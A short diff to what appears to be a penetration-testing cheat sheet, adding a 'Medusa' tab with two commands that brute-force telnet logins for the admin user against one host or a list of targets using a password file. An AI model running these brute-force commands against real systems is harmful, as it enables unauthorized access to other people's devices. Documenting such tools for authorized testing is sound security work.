@@ -19,4 +19,13 @@ set password <>
 ```shellscript
 ```
 {% endtab %}
+
+{% tab title="Medusa" %}
+{% code lineNumbers="true" %}
+```shellscript
+medusa -M telnet -h <IP> -u admin -P passwords.txt
+medusa -M telnet -H targets.txt -u admin -P passwords.txt
+```
+{% endcode %}
+{% endtab %}
 {% endtabs %}
